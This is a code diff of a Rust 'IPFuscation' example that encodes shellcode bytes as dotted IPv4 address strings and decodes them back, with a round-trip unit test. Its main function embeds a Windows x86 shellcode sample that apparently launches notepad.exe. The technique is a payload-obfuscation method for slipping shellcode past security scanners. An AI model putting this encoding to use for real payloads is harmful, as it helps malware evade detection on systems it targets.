@@ -1,13 +1,50 @@
+/*
+IPFuscation (IPv4) example
+Author: sc1341
+Feb 28, 2024
+
+*/
+fn msf_to_rust_array() {} // to be implemented
 
 
+fn shellcode_to_ip_array(mut bytes : Vec<u8>) -> Vec<String> {
+    let mut ip_array: Vec<String> = Vec::new();
+    let mut tmp_str = String::new();
 
+    while (bytes.len() % 4) != 0{
+        bytes.push(0x00);
+    }
 
+    for (index, &byte) in bytes.iter().enumerate() {
+        tmp_str.push_str(&format!("{}", byte));
+        if (index + 1) % 4 != 0 {
+            tmp_str.push('.');
+        } else {
+            ip_array.push(tmp_str.clone());
+            tmp_str.clear();
+        }
+    }
 
-    fn msf_to_rust_array() {} // to be implemented
+    ip_array
+}
+
+fn ip_array_to_shellcode(ip_array: Vec<String>) -> Vec<u8> {
+    let mut bytes: Vec<u8> = Vec::new();
+
+    for ip in ip_array.iter() {
+        let octets = ip.split('.');
+        for octet_str in octets {
+            let octet = octet_str.parse::<u8>().unwrap();
+            bytes.push(octet);
+        }
+    }
+
+    bytes
+}
 
 
 fn main() {
-    let mut bytes: Vec<u8> = vec![
+    let bytes: Vec<u8> = vec![
         0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50,
         0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26,
         0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,
@@ -23,32 +60,34 @@ fn main() {
         0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x53,
         0xff, 0xd5, 0x6e, 0x6f, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00
     ];
-    let mut ip_array: &[&str] = &[];
 
-
-    let mut tmp_str = String::new();
-
-    // apply padding
-    while bytes.len() % 4 != 0 {
-        bytes.push(0x00);
-    }
-
-    let mut ip_array: Vec<String> = Vec::new();
-    let mut tmp_str = String::new();
-
-    for (index, &byte) in bytes.iter().enumerate() {
-        tmp_str.push_str(&format!("{}", byte));
-        if (index + 1) % 4 != 0 {
-            // Append a dot if it's not the last byte in a segment
-            tmp_str.push('.');
-        } else {
-            // End of a segment, push to ip_array and reset tmp_str
-            ip_array.push(tmp_str.clone());
-            tmp_str.clear();
-        }
-    }
-
+    let mut bytes2: Vec<u8> = vec![0xde, 0xad, 0xbe,0xef];
+    let ip_array : Vec<String> = shellcode_to_ip_array(bytes);
     for ip in &ip_array {
         println!("IP segment: {}", ip);
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_shellcode_to_ip_and_back() {
+        // Original bytes to test
+        let original_bytes: Vec<u8> = vec![
+            192, 168, 1, 1,
+            10, 0, 0, 1,
+        ];
+
+        let ip_array = shellcode_to_ip_array(original_bytes.clone());
+
+        for ip in &ip_array {
+            println!("IP segment: {}", ip);
+        }
+
+        let converted_bytes = ip_array_to_shellcode(ip_array);
+
+        assert_eq!(original_bytes, converted_bytes);
     }
 }
